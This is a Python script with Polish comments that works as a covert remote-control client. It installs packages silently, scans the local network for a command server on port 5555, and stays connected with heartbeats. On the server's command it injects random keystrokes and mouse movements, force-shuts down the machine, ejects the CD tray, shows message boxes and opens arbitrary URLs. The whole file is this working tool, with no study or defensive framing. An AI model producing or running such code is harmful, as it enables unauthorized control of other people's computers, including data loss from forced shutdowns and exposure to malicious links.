import subprocess
import sys

# Automatyczna instalacja wymaganych pakietów
required_packages = ["pynput", "pywin32"]
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Reszta importów
import socket
import time
import os
import threading
from pynput.keyboard import Controller as KeyboardController
from pynput.mouse import Controller as MouseController
import random
import ctypes
import webbrowser

PORT = 5555
keyboard = KeyboardController()
mouse = MouseController()

def show_message(message):
    ctypes.windll.user32.MessageBoxW(0, message, "~", 1)

def get_local_network():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        subnet = ".".join(local_ip.split(".")[:3])
        return subnet
    except:
        return "192.168.10"

def scan_network(subnet, port):
    def check_ip(ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((ip, port))
            s.close()
            return ip
        except:
            return None

    threads = []
    results = []

    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        thread = threading.Thread(target=lambda: results.append(check_ip(ip)))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    results = [ip for ip in results if ip]
    return results[0] if results else None

def find_server():
    test_ip = "192.168.10.197"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((test_ip, PORT))
        s.close()
        return test_ip
    except:
        pass

    subnet = get_local_network()
    while True:
        server_ip = scan_network(subnet, PORT)
        if server_ip:
            return server_ip
        time.sleep(5)

def ping_server(client_socket):
    while True:
        try:
            client_socket.send("PING".encode())
            time.sleep(3)
        except:
            break

def random_typing(duration):
    end_time = time.time() + duration
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    while time.time() < end_time:
        char = random.choice(chars)
        keyboard.press(char)
        keyboard.release(char)
        time.sleep(random.uniform(0.1, 0.3))

def random_cursor(duration):
    screen_width, screen_height = 1920, 1080
    end_time = time.time() + duration

    while time.time() < end_time:
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        mouse.position = (x, y)
        time.sleep(random.uniform(0.1, 0.5))

def open_link(url):
    webbrowser.open(url)

def client_main():
    server_ip = find_server()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            client.connect((server_ip, PORT))
            break
        except:
            time.sleep(5)

    threading.Thread(target=ping_server, args=(client,), daemon=True).start()

    while True:
        try:
            data = client.recv(1024).decode()
            if not data:
                break

            if data.startswith("RANDOM_TYPING:"):
                duration = int(data.split(":")[1])
                threading.Thread(target=random_typing, args=(duration,)).start()
            elif data.startswith("RANDOM_CURSOR:"):
                duration = int(data.split(":")[1])
                threading.Thread(target=random_cursor, args=(duration,)).start()
            elif data == "SHUTDOWN":
                os.system("shutdown /s /f /t 0")
            elif data == "OPEN_CD":
                subprocess.run(["powershell", "/min", "powershell", "-command", "(new-object -com 'WMPlayer.OCX.7').cdromCollection.Item(0).Eject()"])
            elif data.startswith("msg:"):
                message = data.split("msg:")[1]
                show_message(message)
            elif data.startswith("OPEN_LINK:"):
                url = data.split("OPEN_LINK:")[1]
                open_link(url)
        except:
            server_ip = find_server()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            continue

if __name__ == "__main__":
    client_main()
